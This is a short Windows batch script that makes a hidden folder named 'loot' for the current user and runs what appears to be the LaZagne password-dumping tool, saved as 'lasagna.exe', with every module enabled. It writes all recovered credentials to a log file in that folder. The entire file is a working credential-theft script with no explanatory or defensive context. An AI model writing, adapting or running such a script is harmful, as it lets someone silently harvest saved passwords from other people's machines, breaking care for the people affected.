@echo off
md loot\%username%\
attrib +h loot
lasagna.exe all -vvv >>loot\%username%\logs.txt